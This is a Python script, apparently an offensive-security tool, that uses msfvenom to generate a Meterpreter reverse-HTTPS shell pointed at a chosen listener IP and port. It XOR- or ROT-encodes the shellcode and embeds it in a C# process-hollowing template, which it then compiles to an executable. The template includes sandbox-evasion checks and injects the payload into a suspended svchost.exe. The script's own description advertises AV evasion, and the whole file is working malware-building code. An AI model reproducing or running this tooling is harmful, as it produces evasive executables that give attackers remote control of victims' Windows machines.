#!/usr/bin/python3

## CREDITS FOR C# PART GOES TO: https://github.com/chvancooten/

import subprocess, argparse, ipaddress, os, re, glob
from datetime import datetime
from random import randint

## Colours
MAIN = PURPLE = '\033[35m'
BLUEISH = '\033[38;5;80m'
PLOAD = '\033[38;5;119m'
GREEN = '\033[38;5;47m'
BLUE = '\033[0;38;5;12m'
ORANGE = '\033[0;38;5;214m'
PINK = '\033[0;38;5;218m'
RED = '\033[1;31m'
END = '\033[0m'
BOLD = '\033[1m'


## MSG Prefixes
INFO = f'{MAIN}[+]{END}'
WARN = f'{ORANGE}[!]{END}'
IMPORTANT = f'{PINK}[!!!]{END}'
FAILED = f'{RED}[-]{END}'
DEBUG = f'{GREEN}[?]{END}'
LINE = f'{MAIN}------------{END}'

## Arguments
parser = argparse.ArgumentParser(description='Create meterpreter rev shell, with C# sandbox evasion, and military-grade XOR/ROT encryption techniques!')
parser.add_argument('payload', nargs='?', help='payload to create for msfvenom (msfvenom --list payloads)',  default='windows/x64/meterpreter/reverse_https')
parser.add_argument('lhost', help='listener IP')
parser.add_argument('-p', '--port', help='listener port (default: 443)',  nargs='?', default='443', type=int)
parser.add_argument('-o','--outfile', nargs='?', help='name of file to out (without extension)', default='badger')
parser.add_argument('-t','--technique', nargs='?', help='xor/rot encryption', default='xor', choices=['xor','rot'])
parser.add_argument('-v','--verbose', help='verbosity of all stdout & stderr', action='store_true')
parser.add_argument('-d','--delete', help='delete temporary paylods, and out only final .exe', action='store_true')
parser.add_argument('-s','--show', help='just show the output of encryption and decryption functions, delete any tmp files after, and do NOT compile .exe', action='store_true')

args = parser.parse_args()

## Payload creation with msfvenom
def payloadCreation(payload, lhost, lport, verbose, payloadname,show):

    print(f'{INFO} Creating payload with selected attributes:')
    print(f'{LINE}')
    print(f'{INFO} Payload: {BLUEISH}{payload}{END}')
    print(f'{INFO} IP: {BLUEISH}{str(lhost)}{END}')
    print(f'{INFO} Port: {BLUEISH}{str(lport)}{END}')
    print(f'{LINE}')

    ## generating 'badger-YMD_H-M-S.bin' as temporary payload file
    timest = datetime.now()
    strst = timest.strftime("%Y%m%d_%H-%M-%S")
    # payname = 'badger-'+ strst +'.bin'
    payname = payloadname + '-' + strst + '-original.cs'

    ## msfvenom creation with selected payload, ip, port
    # process = subprocess.Popen(['msfvenom', '-p', payload, 'LHOST='+str(lhost), 'LPORT='+str(lport), '-f', 'raw', '-o', payname, 'exitfunc=thread'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
    process = subprocess.Popen(['msfvenom', '-p', payload, 'LHOST='+str(lhost), 'LPORT='+str(lport), '-f', 'csharp', '-o', payname, 'exitfunc=thread'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
    # process = subprocess.Popen(['msfvenom', '-p', 'windows/exec', '-f', 'csharp', '-o', payname, 'exitfunc=thread'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
    stdout, stderr = process.communicate()
    if (process.returncode !=0): 
        print(f'{FAILED} {RED}Something went wrong! Printing stderr from msfvenom:{END}')
        print(stdout, stderr)
        print(f'{LINE}')
        exit(f'{FAILED} Exiting now.')
    
    if (verbose): 
        print(f'{DEBUG} Debug:')
        print(stdout, stderr)
        print(f'{LINE}')

    if (show):
        return payname
        
    print(f'{WARN} Original {BLUEISH}Payload{END} filename: {BLUEISH}{payname}{END}')
    print(f'{LINE}')

    return payname


def encryptionMagic(filename, technique, show=False):
    ## check if temp (original) payload file can be opened
    try:
        with open(filename+"-original.cs", "rb") as f:
            payload = f.read()

    except:
        exit(f'{FAILED} {RED}Cannot read file: {filename}{END}')
    
    ## regex to group payload
    payload = re.search(r"{([^}]+)}", payload.decode("utf-8")).group(1).replace('\n', '').split(",")

    ## random int for key and 'encryption'

    enckey = randint(1,255)
    for i, byte in enumerate(payload):
        byteInt = int(byte, 16)

        if technique == "xor":
            byteInt = byteInt ^ enckey
        elif technique == "rot":
            byteInt = byteInt + enckey & 255
        else:
            exit(f"{FAILED} {RED}ERROR: Invalid encoding type.{END}")

        payload[i] = "{0:#0{1}x}".format(byteInt,4)

    payLen = len(payload)
    payload = re.sub("(.{65})", "\\1\n", ','.join(payload), 0, re.DOTALL)
    # payloadFormatted = f"// msfvenom -p {args.payload} LHOST={args.lhost} LPORT={args.lport} EXITFUNC=thread -f csharp\n"
    
    print(f'{INFO} Payload {BLUEISH}{technique}{END}-encoded with key {BLUEISH}{hex(enckey)}{END}')
    payloadFormatted = f"byte[] buf = new byte[{str(payLen)}] {{\n{payload.strip()}\n}};"

    if (show):
        print(f'{INFO} {BLUEISH}Encoded payload{END}:')
        print(f'{LINE}')
        print(f'{payloadFormatted}')
    else:   
        ## Writing payload and decoding functions to file
        f = open(filename+"-payload.cs", "w")
        f.write(payloadFormatted)
        f.close()
        print(f'{INFO} {BLUEISH}Encoded payload{END} written to {BLUEISH}"'+filename+f'-payload.cs"{END} in CSharp format!')

    ## Provide the decoding function for the heck of it
    if technique == "xor":
        decodingFunc = f"""for (int i = 0; i < buf.Length; i++)
    {{
        buf[i] = (byte)((uint)buf[i] ^ {hex(enckey)});
    }}"""

    if technique == "rot":
        decodingFunc = f"""for (int i = 0; i < buf.Length; i++)
    {{
        buf[i] = (byte)(((uint)buf[i] - {hex(enckey)}) & 0xFF);
    }}"""

    if (show):
        print(f'{INFO} {BLUEISH}Decoding function{END}:')
        print(f'{LINE}')
        print(f'{decodingFunc}')
    else:   
        ## Save decryption function to file
        f = open(filename+"-decode.cs", "w")
        f.write(decodingFunc)
        f.close()
        print(f'{INFO} {BLUEISH}Decoding function{END} written to {BLUEISH}"'+filename+f'-decode.cs"{END} in CSharp format!')
        print(f'{LINE}')
    
    if (show):
        ## Delete original file
        process = subprocess.Popen(['rm', '-rf', './'+filename+'-original.cs'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        stdout, stderr = process.communicate()

        if (verbose): 
            print(f'{DEBUG} Debug:')
            print(stdout, stderr)
            print(f'{LINE}')

        exit(f'{LINE}')

    return

def hollowingTime(filename,payloadname):

    fnamepay = filename+"-payload.cs"
    fnamedeco = filename+"-decode.cs"

    try:
        with open(fnamepay, "r") as f:
            payload = f.read()

    except:
        exit(f'{FAILED} {RED}Cannot read file: {fnamepay}{END}')

    try:
        with open(fnamedeco, "r") as f:
            decodefunction = f.read()

    except:
        exit(f'{FAILED} {RED}Cannot read file: {fnamedeco}{END}')

    csharp = """
using System;
using System.Runtime.InteropServices;

namespace ProcessHollowing
{
    public class Program
    {
        public const uint CREATE_SUSPENDED = 0x4;
        public const int PROCESSBASICINFORMATION = 0;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct ProcessInfo
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public Int32 ProcessId;
            public Int32 ThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct StartupInfo
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct ProcessBasicInfo
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

		[DllImport("kernel32.dll")]
		static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref StartupInfo lpStartupInfo, out ProcessInfo lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref ProcessBasicInfo procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfbytesRW);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        public static void Main(string[] args)
        {
            // AV evasion: Sleep for 2s and detect if time really passed
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (deltaT < 1.5)
            {
                return;
            }

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
	        if (mem == null)
	        {
	            return;
	        }

            // pld encryptd
            ##PAYLOAD##

            // Start 'svchost.exe' in a suspended state
            StartupInfo sInfo = new StartupInfo();
            ProcessInfo pInfo = new ProcessInfo();
            bool cResult = CreateProcess(null, "c:\\\\windows\\\\system32\\\\svchost.exe", IntPtr.Zero, IntPtr.Zero,
                false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo);
            Console.WriteLine($"Started 'svchost.exe' in a suspended state with PID {pInfo.ProcessId}. Success: {cResult}.");

            // Get Process Environment Block (PEB) memory address of suspended process (offset 0x10 from base image)
            ProcessBasicInfo pbInfo = new ProcessBasicInfo();
            uint retLen = new uint();
            long qResult = ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION, ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);
            IntPtr baseImageAddr = (IntPtr)((Int64)pbInfo.PebAddress + 0x10);
            Console.WriteLine($"Got process information and located PEB address of process at {"0x" + baseImageAddr.ToString("x")}. Success: {qResult == 0}.");

            // Get entry point of the actual process executable
            // This one is a bit complicated, because this address differs for each process (due to Address Space Layout Randomization (ASLR))
            // From the PEB (address we got in last call), we have to do the following:
            // 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing
            // 2. Read the field 'e_lfanew', 4 bytes at offset 0x3C from executable address to get the offset for the PE header
            // 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
            // 4. Read the value at the RVA offset address to get the offset of the executable entrypoint from the executable address
            // 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!

            // 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing
            byte[] procAddr = new byte[0x8];
            byte[] dataBuf = new byte[0x200];
            IntPtr bytesRW = new IntPtr();
            bool result = ReadProcessMemory(pInfo.hProcess, baseImageAddr, procAddr, procAddr.Length, out bytesRW);
            IntPtr executableAddress = (IntPtr)BitConverter.ToInt64(procAddr, 0);
            result = ReadProcessMemory(pInfo.hProcess, executableAddress, dataBuf, dataBuf.Length, out bytesRW);
            Console.WriteLine($"DEBUG: Executable base address: {"0x" + executableAddress.ToString("x")}.");

            // 2. Read the field 'e_lfanew', 4 bytes (UInt32) at offset 0x3C from executable address to get the offset for the PE header
            uint e_lfanew = BitConverter.ToUInt32(dataBuf, 0x3c);
            Console.WriteLine($"DEBUG: e_lfanew offset: {"0x" + e_lfanew.ToString("x")}.");

            // 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
            uint rvaOffset = e_lfanew + 0x28;
            Console.WriteLine($"DEBUG: RVA offset: {"0x" + rvaOffset.ToString("x")}.");

            // 4. Read the 4 bytes (UInt32) at the RVA offset to get the offset of the executable entrypoint from the executable address
            uint rva = BitConverter.ToUInt32(dataBuf, (int)rvaOffset);
            Console.WriteLine($"DEBUG: RVA value: {"0x" + rva.ToString("x")}.");

            // 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!
            IntPtr entrypointAddr = (IntPtr)((Int64)executableAddress + rva);
            Console.WriteLine($"Got executable entrypoint address: {"0x" + entrypointAddr.ToString("x")}.");

            // Carrying on, decode the payload
            ##DECODEFUNC##

            Console.WriteLine("Decoded payload.");

            // Overwrite the memory at the identified address to 'hijack' the entrypoint of the executable
            result = WriteProcessMemory(pInfo.hProcess, entrypointAddr, buf, buf.Length, out bytesRW);
            Console.WriteLine($"Overwrote entrypoint with payload. Success: {result}.");

            // Resume the thread to trigger our payload
            uint rResult = ResumeThread(pInfo.hThread);
            Console.WriteLine($"Triggered payload. Success: {rResult == 1}. Check your listener!");
        }
    }
}
    """

    ## replace placeholders in cs code, with actual payload & decode function
    csharp = csharp.replace("##PAYLOAD##",payload)
    csharp = csharp.replace("##DECODEFUNC##",decodefunction)

    print(f'{INFO} {BLUEISH}Final payload{END} written to {BLUEISH}"'+filename+f'-final.cs"{END} in CSharp format!')
    print(f'{LINE}')
    csfilename = filename+"-final.cs"
    f = open(csfilename, "w")
    f.write(csharp)
    f.close()


    ## compile it with mcs (https://www.mono-project.com/docs/about-mono/languages/csharp/)
    print(f'{INFO} Compiling payload with mcs')
    print(f'{LINE}')
    process = subprocess.Popen(['mcs', '-out:'+payloadname+'.exe', csfilename], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
    stdout, stderr = process.communicate()
    if (verbose): 
        print(f'{DEBUG} Debug:')
        print(stdout, stderr)
        print(f'{LINE}')
    return

## Temporary files deletion if requested by user
def deleteTmps(out,filename):
    ## Delete original file
    print(f'{WARN} Deleting temporary files (original/payload/decryption/final), and leving just {BLUEISH}{filename}.exe{END}')
    files = glob.glob(out+"*")
    for file in files:
        os.remove(file)
    
    return

## Sanity check for root, if needed
def isRoot():
    if os.geteuid() != 0:
        exit(f'{IMPORTANT} You need to run this script as {RED}root{END}!')
    return

## Main function
if __name__ == "__main__":
    
    technique = args.technique
    payload = args.payload
    hostip = ipaddress.ip_address(args.lhost)
    hostport = args.port
    verbose = args.verbose
    payloadname = args.outfile
    showxor = args.show
    deletepls = args.delete

    # isRoot()
    if(hostport <= 0):
        exit(f'{FAILED} Port cannot be: {hostport}')


    out = payloadCreation(payload, hostip, hostport, verbose, payloadname, showxor)
    ## Getting filename without extension with regex because i can
    out = re.split('-original.cs',out)[0]

    encryptionMagic(out,technique,showxor)
    hollowingTime(out,payloadname)
    if (deletepls):
        deleteTmps(out,payloadname)
    else:
        print(f'{IMPORTANT} Success! Payload {BLUEISH}{payloadname}.exe{END} is ready! Happy hacking :)')